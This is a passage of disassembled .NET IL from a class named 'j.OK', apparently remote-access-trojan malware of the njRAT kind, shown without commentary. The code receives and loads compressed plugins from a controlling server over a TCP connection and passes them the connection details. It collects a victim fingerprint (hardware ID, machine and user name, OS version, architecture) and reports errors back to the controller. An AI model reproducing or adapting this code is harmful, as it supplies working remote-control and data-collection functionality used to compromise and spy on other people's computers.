      IL_1019:  brfalse.s  IL_107f

      IL_101b:  ldstr      "PLG"
      IL_1020:  call       bool j.OK::Send(string)
      IL_1025:  pop
      IL_1026:  ldc.i4.0
      IL_1027:  stloc.s    V_46
      IL_1029:  br.s       IL_103d

      IL_102b:  ldloc.s    V_46
      IL_102d:  ldc.i4.1
      IL_102e:  add.ovf
      IL_102f:  stloc.s    V_46
      IL_1031:  ldc.i4     0x3e8
      IL_1036:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_103b:  nop
      IL_103c:  nop
      IL_103d:  ldsfld     object j.OK::PLG
      IL_1042:  ldnull
      IL_1043:  ceq
      IL_1045:  ldc.i4.0
      IL_1046:  ceq
      IL_1048:  ldloc.s    V_46
      IL_104a:  ldc.i4.s   20
      IL_104c:  ceq
      IL_104e:  or
      IL_104f:  ldsfld     bool j.OK::Cn
      IL_1054:  ldc.i4.0
      IL_1055:  ceq
      IL_1057:  or
      IL_1058:  ldc.i4.0
      IL_1059:  ceq
      IL_105b:  stloc.s    V_73
      IL_105d:  ldloc.s    V_73
      IL_105f:  brtrue.s   IL_102b

      IL_1061:  ldsfld     object j.OK::PLG
      IL_1066:  ldnull
      IL_1067:  ceq
      IL_1069:  ldsfld     bool j.OK::Cn
      IL_106e:  ldc.i4.0
      IL_106f:  ceq
      IL_1071:  or
      IL_1072:  stloc.s    V_73
      IL_1074:  ldloc.s    V_73
      IL_1076:  brfalse.s  IL_107e

      IL_1078:  nop
      IL_1079:  leave      IL_12be

      IL_107e:  nop
      IL_107f:  nop
      IL_1080:  ldc.i4.1
      IL_1081:  newarr     [mscorlib]System.Object
      IL_1086:  stloc.s    V_57
      IL_1088:  ldloc.s    V_57
      IL_108a:  ldc.i4.0
      IL_108b:  ldarg.0
      IL_108c:  stelem.ref
      IL_108d:  nop
      IL_108e:  ldloc.s    V_57
      IL_1090:  stloc.s    V_44
      IL_1092:  ldc.i4.1
      IL_1093:  newarr     [mscorlib]System.Boolean
      IL_1098:  stloc.s    V_71
      IL_109a:  ldloc.s    V_71
      IL_109c:  ldc.i4.0
      IL_109d:  ldc.i4.1
      IL_109e:  stelem.i1
      IL_109f:  ldloc.s    V_71
      IL_10a1:  stloc.s    V_45
      IL_10a3:  ldsfld     object j.OK::PLG
      IL_10a8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_10ad:  ldnull
      IL_10ae:  ldstr      "ind"
      IL_10b3:  ldloc.s    V_44
      IL_10b5:  ldnull
      IL_10b6:  ldnull
      IL_10b7:  ldloc.s    V_45
      IL_10b9:  ldc.i4.1
      IL_10ba:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_10bf:  pop
      IL_10c0:  ldloc.s    V_45
      IL_10c2:  ldc.i4.0
      IL_10c3:  ldelem.i1
      IL_10c4:  stloc.s    V_73
      IL_10c6:  ldloc.s    V_73
      IL_10c8:  brfalse.s  IL_10f3

      IL_10ca:  ldloc.s    V_44
      IL_10cc:  ldc.i4.0
      IL_10cd:  ldelem.ref
      IL_10ce:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_10d3:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_10d8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_10dd:  ldtoken    uint8[]
      IL_10e2:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_10e7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_10ec:  castclass  uint8[]
      IL_10f1:  starg.s    b
      IL_10f3:  nop
      IL_10f4:  br         IL_11ec

      IL_10f9:  ldloc.s    V_7
      IL_10fb:  ldstr      "PLG"
      IL_1100:  ldc.i4.0
      IL_1101:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1106:  ldc.i4.0
      IL_1107:  ceq
      IL_1109:  stloc.s    V_73
      IL_110b:  ldloc.s    V_73
      IL_110d:  brfalse    IL_11ec

      IL_1112:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_1117:  stloc.s    V_48
      IL_1119:  ldloc.0
      IL_111a:  ldc.i4.0
      IL_111b:  ldelem.ref
      IL_111c:  ldsfld     string j.OK::Y
      IL_1121:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1126:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_112b:  stloc.s    V_47
      IL_112d:  ldloc.s    V_48
      IL_112f:  ldarg.0
      IL_1130:  ldloc.s    V_47
      IL_1132:  ldarg.0
      IL_1133:  ldlen
      IL_1134:  conv.ovf.i4
      IL_1135:  ldloc.s    V_47
      IL_1137:  sub.ovf
      IL_1138:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_113d:  nop
      IL_113e:  ldloc.s    V_48
      IL_1140:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_1145:  call       uint8[] j.OK::ZIP(uint8[])
      IL_114a:  ldstr      "A"
      IL_114f:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_1154:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1159:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_115e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1163:  stsfld     object j.OK::PLG
      IL_1168:  ldsfld     object j.OK::PLG
      IL_116d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1172:  ldnull
      IL_1173:  ldstr      "H"
      IL_1178:  ldc.i4.1
      IL_1179:  newarr     [mscorlib]System.Object
      IL_117e:  stloc.s    V_57
      IL_1180:  ldloc.s    V_57
      IL_1182:  ldc.i4.0
      IL_1183:  ldsfld     string j.OK::H
      IL_1188:  stelem.ref
      IL_1189:  nop
      IL_118a:  ldloc.s    V_57
      IL_118c:  ldnull
      IL_118d:  ldnull
      IL_118e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1193:  nop
      IL_1194:  ldsfld     object j.OK::PLG
      IL_1199:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_119e:  ldnull
      IL_119f:  ldstr      "P"
      IL_11a4:  ldc.i4.1
      IL_11a5:  newarr     [mscorlib]System.Object
      IL_11aa:  stloc.s    V_57
      IL_11ac:  ldloc.s    V_57
      IL_11ae:  ldc.i4.0
      IL_11af:  ldsfld     string j.OK::P
      IL_11b4:  stelem.ref
      IL_11b5:  nop
      IL_11b6:  ldloc.s    V_57
      IL_11b8:  ldnull
      IL_11b9:  ldnull
      IL_11ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_11bf:  nop
      IL_11c0:  ldsfld     object j.OK::PLG
      IL_11c5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_11ca:  ldnull
      IL_11cb:  ldstr      "c"
      IL_11d0:  ldc.i4.1
      IL_11d1:  newarr     [mscorlib]System.Object
      IL_11d6:  stloc.s    V_57
      IL_11d8:  ldloc.s    V_57
      IL_11da:  ldc.i4.0
      IL_11db:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_11e0:  stelem.ref
      IL_11e1:  nop
      IL_11e2:  ldloc.s    V_57
      IL_11e4:  ldnull
      IL_11e5:  ldnull
      IL_11e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_11eb:  nop
      IL_11ec:  nop
      IL_11ed:  leave      IL_12bd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_11f2:  dup
      IL_11f3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_11f8:  stloc.s    V_49
      IL_11fa:  nop
      IL_11fb:  ldloc.s    V_49
      IL_11fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_1202:  nop
      IL_1203:  ldloc.s    V_49
      IL_1205:  stloc.s    V_50
      IL_1207:  ldloc.0
      IL_1208:  ldlen
      IL_1209:  conv.ovf.i4
      IL_120a:  ldc.i4.0
      IL_120b:  ble.s      IL_1232

      IL_120d:  ldloc.0
      IL_120e:  ldc.i4.0
      IL_120f:  ldelem.ref
      IL_1210:  ldstr      "Ex"
      IL_1215:  ldc.i4.0
      IL_1216:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_121b:  ldc.i4.0
      IL_121c:  ceq
      IL_121e:  ldloc.0
      IL_121f:  ldc.i4.0
      IL_1220:  ldelem.ref
      IL_1221:  ldstr      "PLG"
      IL_1226:  ldc.i4.0
      IL_1227:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_122c:  ldc.i4.0
      IL_122d:  ceq
      IL_122f:  or
      IL_1230:  brtrue.s   IL_1235

      IL_1232:  ldc.i4.0
      IL_1233:  br.s       IL_1236

      IL_1235:  ldc.i4.1
      IL_1236:  stloc.s    V_73
      IL_1238:  ldloc.s    V_73
      IL_123a:  brfalse.s  IL_1242

      IL_123c:  ldnull
      IL_123d:  stsfld     object j.OK::PLG
      IL_1242:  nop
      IL_1243:  nop
      .try
      {
        IL_1244:  ldc.i4.5
        IL_1245:  newarr     [mscorlib]System.String
        IL_124a:  stloc.s    V_56
        IL_124c:  ldloc.s    V_56
        IL_124e:  ldc.i4.0
        IL_124f:  ldstr      "ER"
        IL_1254:  stelem.ref
        IL_1255:  nop
        IL_1256:  ldloc.s    V_56
        IL_1258:  ldc.i4.1
        IL_1259:  ldsfld     string j.OK::Y
        IL_125e:  stelem.ref
        IL_125f:  nop
        IL_1260:  ldloc.s    V_56
        IL_1262:  ldc.i4.2
        IL_1263:  ldloc.0
        IL_1264:  ldc.i4.0
        IL_1265:  ldelem.ref
        IL_1266:  stelem.ref
        IL_1267:  nop
        IL_1268:  ldloc.s    V_56
        IL_126a:  ldc.i4.3
        IL_126b:  ldsfld     string j.OK::Y
        IL_1270:  stelem.ref
        IL_1271:  nop
        IL_1272:  ldloc.s    V_56
        IL_1274:  ldc.i4.4
        IL_1275:  ldloc.s    V_50
        IL_1277:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_127c:  stelem.ref
        IL_127d:  nop
        IL_127e:  ldloc.s    V_56
        IL_1280:  call       string [mscorlib]System.String::Concat(string[])
        IL_1285:  call       bool j.OK::Send(string)
        IL_128a:  pop
        IL_128b:  leave.s    IL_12af

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_128d:  dup
        IL_128e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1293:  stloc.s    V_51
        IL_1295:  nop
        IL_1296:  ldloc.s    V_51
        IL_1298:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_129d:  nop
        IL_129e:  ldloc.s    V_51
        IL_12a0:  stloc.s    V_52
        IL_12a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_12a7:  nop
        IL_12a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_12ad:  leave.s    IL_12af

      }  // end handler
      IL_12af:  nop
      IL_12b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_12b5:  nop
      IL_12b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_12bb:  leave.s    IL_12bd

    }  // end handler
    IL_12bd:  nop
    IL_12be:  nop
    IL_12bf:  ret
  } // end of method OK::Ind

  .method public static pinvokeimpl("winmm.dll" winapi) 
          int32  mciSendString(string command,
                               class [mscorlib]System.Text.StringBuilder buffer,
                               int32 bufferSize,
                               native int hwndCallback) cil managed preservesig
  {
  }
  .method public static string  inf() cil managed
  {
    // Code size       1194 (0x4aa)
    .maxstack  4
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             string[] V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.Exception V_15,
             class [mscorlib]System.Exception V_16,
             class [mscorlib]System.Exception V_17,
             string V_18,
             class [mscorlib]System.Exception V_19,
             class [mscorlib]System.Exception V_20,
             string V_21,
             string V_22,
             valuetype [mscorlib]System.DateTime V_23,
             valuetype [mscorlib]System.DateTime V_24,
             string[] V_25,
             int32 V_26,
             string[] V_27,
             bool V_28)
    IL_0000:  nop
    IL_0001:  ldstr      "ll"
    IL_0006:  ldsfld     string j.OK::Y
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.1
    IL_0011:  nop
    .try
    {
      IL_0012:  ldstr      "vn"
      IL_0017:  ldstr      ""
      IL_001c:  call       object j.OK::GTV(string,
                                            object)
      IL_0021:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0026:  ldstr      ""
      IL_002b:  ldc.i4.0
      IL_002c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_0031:  stloc.s    V_28
      IL_0033:  ldloc.s    V_28
      IL_0035:  brfalse.s  IL_0067

      IL_0037:  ldloc.1
      IL_0038:  ldsflda    string j.OK::VN
      IL_003d:  call       string j.OK::DEB(string&)
      IL_0042:  ldstr      "_"
      IL_0047:  call       string j.OK::HWD()
      IL_004c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0051:  stloc.s    V_21
      IL_0053:  ldloca.s   V_21
      IL_0055:  call       string j.OK::ENB(string&)
      IL_005a:  ldsfld     string j.OK::Y
      IL_005f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0064:  stloc.1
      IL_0065:  br.s       IL_00ae

      IL_0067:  nop
      IL_0068:  ldloc.1
      IL_0069:  ldstr      "vn"
      IL_006e:  ldstr      ""
      IL_0073:  call       object j.OK::GTV(string,
                                            object)
      IL_0078:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007d:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0082:  stloc.s    V_21
      IL_0084:  ldloca.s   V_21
      IL_0086:  call       string j.OK::DEB(string&)
      IL_008b:  ldstr      "_"
      IL_0090:  call       string j.OK::HWD()
      IL_0095:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_009a:  stloc.s    V_22
      IL_009c:  ldloca.s   V_22
      IL_009e:  call       string j.OK::ENB(string&)
      IL_00a3:  ldsfld     string j.OK::Y
      IL_00a8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ad:  stloc.1
      IL_00ae:  nop
      IL_00af:  leave.s    IL_00ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b1:  dup
      IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b7:  stloc.s    V_4
      IL_00b9:  nop
      IL_00ba:  ldloc.s    V_4
      IL_00bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c1:  nop
      IL_00c2:  ldloc.s    V_4
      IL_00c4:  stloc.3
      IL_00c5:  ldloc.1
      IL_00c6:  call       string j.OK::HWD()
      IL_00cb:  stloc.s    V_22
      IL_00cd:  ldloca.s   V_22
      IL_00cf:  call       string j.OK::ENB(string&)
      IL_00d4:  ldsfld     string j.OK::Y
      IL_00d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00de:  stloc.1
      IL_00df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e4:  nop
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ea:  leave.s    IL_00ec

    }  // end handler
    IL_00ec:  nop
    IL_00ed:  nop
    .try
    {
      IL_00ee:  ldloc.1
      IL_00ef:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00f4:  ldsfld     string j.OK::Y
      IL_00f9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00fe:  stloc.1
      IL_00ff:  leave.s    IL_0134

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0101:  dup
      IL_0102:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0107:  stloc.s    V_6
      IL_0109:  nop
      IL_010a:  ldloc.s    V_6
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  nop
      IL_0112:  ldloc.s    V_6
      IL_0114:  stloc.s    V_5
      IL_0116:  ldloc.1
      IL_0117:  ldstr      "\?\?"
      IL_011c:  ldsfld     string j.OK::Y
      IL_0121:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0126:  stloc.1
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012c:  nop
      IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0132:  leave.s    IL_0134

    }  // end handler
    IL_0134:  nop
    IL_0135:  nop
    .try
    {
      IL_0136:  ldloc.1
      IL_0137:  call       string [mscorlib]System.Environment::get_UserName()
      IL_013c:  ldsfld     string j.OK::Y
      IL_0141:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0146:  stloc.1
      IL_0147:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0149:  dup
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014f:  stloc.s    V_7
      IL_0151:  nop
      IL_0152:  ldloc.s    V_7
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0159:  nop
      IL_015a:  ldloc.s    V_7
      IL_015c:  stloc.s    V_8
      IL_015e:  ldloc.1
      IL_015f:  ldstr      "\?\?"
      IL_0164:  ldsfld     string j.OK::Y
      IL_0169:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_016e:  stloc.1
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  nop
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  nop
    IL_017d:  nop
    .try
    {
      IL_017e:  ldloc.1
      IL_017f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0184:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0189:  stloc.s    V_23
      IL_018b:  ldloca.s   V_23
      IL_018d:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_0192:  stloc.s    V_24
      IL_0194:  ldloca.s   V_24
      IL_0196:  ldstr      "yy-MM-dd"
      IL_019b:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_01a0:  ldsfld     string j.OK::Y
      IL_01a5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01aa:  stloc.1
      IL_01ab:  leave.s    IL_01e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ad:  dup
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b3:  stloc.s    V_9
      IL_01b5:  nop
      IL_01b6:  ldloc.s    V_9
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  nop
      IL_01be:  ldloc.s    V_9
      IL_01c0:  stloc.s    V_10
      IL_01c2:  ldloc.1
      IL_01c3:  ldstr      "\?\?-\?\?-\?\?"
      IL_01c8:  ldsfld     string j.OK::Y
      IL_01cd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01d2:  stloc.1
      IL_01d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d8:  nop
      IL_01d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01de:  leave.s    IL_01e0

    }  // end handler
    IL_01e0:  nop
    IL_01e1:  ldloc.1
    IL_01e2:  ldstr      ""
    IL_01e7:  ldsfld     string j.OK::Y
    IL_01ec:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_01f1:  stloc.1
    IL_01f2:  nop
    .try
    {
      IL_01f3:  ldloc.1
      IL_01f4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01f9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01fe:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_0203:  ldstr      "Microsoft"
      IL_0208:  ldstr      ""
      IL_020d:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0212:  ldstr      "Windows"
      IL_0217:  ldstr      "Win"
      IL_021c:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0221:  ldstr      bytearray (AE 00 ) 
      IL_0226:  ldstr      ""
      IL_022b:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0230:  ldstr      bytearray (22 21 )                                           // "!
      IL_0235:  ldstr      ""
      IL_023a:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_023f:  ldstr      "  "
      IL_0244:  ldstr      " "
      IL_0249:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_024e:  ldstr      " Win"
      IL_0253:  ldstr      "Win"
      IL_0258:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_025d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0262:  stloc.1
      IL_0263:  leave.s    IL_0293

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0265:  dup
      IL_0266:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_026b:  stloc.s    V_11
      IL_026d:  nop
      IL_026e:  ldloc.s    V_11
      IL_0270:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0275:  nop
      IL_0276:  ldloc.s    V_11
      IL_0278:  stloc.s    V_12
      IL_027a:  ldloc.1
      IL_027b:  ldstr      "\?\?"
      IL_0280:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0285:  stloc.1
      IL_0286:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_028b:  nop
      IL_028c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0291:  leave.s    IL_0293

    }  // end handler
    IL_0293:  nop
    IL_0294:  ldloc.1
    IL_0295:  ldstr      "SP"
    IL_029a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_029f:  stloc.1
    IL_02a0:  nop
    .try
    {
      IL_02a1:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_02a6:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_02ab:  ldstr      " "
      IL_02b0:  ldc.i4.m1
      IL_02b1:  ldc.i4.0
      IL_02b2:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_02b7:  stloc.s    V_13
      IL_02b9:  ldloc.s    V_13
      IL_02bb:  ldlen
      IL_02bc:  conv.ovf.i4
      IL_02bd:  ldc.i4.1
      IL_02be:  ceq
      IL_02c0:  stloc.s    V_28
      IL_02c2:  ldloc.s    V_28
      IL_02c4:  brfalse.s  IL_02d2

      IL_02c6:  ldloc.1
      IL_02c7:  ldstr      "0"
      IL_02cc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02d1:  stloc.1
      IL_02d2:  nop
      IL_02d3:  ldloc.1
      IL_02d4:  ldloc.s    V_13
      IL_02d6:  ldloc.s    V_13
      IL_02d8:  ldlen
      IL_02d9:  conv.ovf.i4
      IL_02da:  ldc.i4.1
      IL_02db:  sub.ovf
      IL_02dc:  ldelem.ref
      IL_02dd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02e2:  stloc.1
      IL_02e3:  leave.s    IL_0313

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e5:  dup
      IL_02e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02eb:  stloc.s    V_14
      IL_02ed:  nop
      IL_02ee:  ldloc.s    V_14
      IL_02f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02f5:  nop
      IL_02f6:  ldloc.s    V_14
      IL_02f8:  stloc.s    V_15
      IL_02fa:  ldloc.1
      IL_02fb:  ldstr      "0"
      IL_0300:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0305:  stloc.1
      IL_0306:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_030b:  nop
      IL_030c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0311:  leave.s    IL_0313

    }  // end handler
    IL_0313:  nop
    IL_0314:  nop
    .try
    {
      IL_0315:  ldc.i4.s   38
      IL_0317:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_031c:  ldstr      "x86"
      IL_0321:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_0326:  stloc.s    V_28
      IL_0328:  ldloc.s    V_28
      IL_032a:  brfalse.s  IL_033f

      IL_032c:  ldloc.1
      IL_032d:  ldstr      " x64"
      IL_0332:  ldsfld     string j.OK::Y
      IL_0337:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_033c:  stloc.1
      IL_033d:  br.s       IL_0351

      IL_033f:  nop
      IL_0340:  ldloc.1
      IL_0341:  ldstr      " x86"
      IL_0346:  ldsfld     string j.OK::Y
      IL_034b:  call       string [mscorlib]System.String::Concat(string,
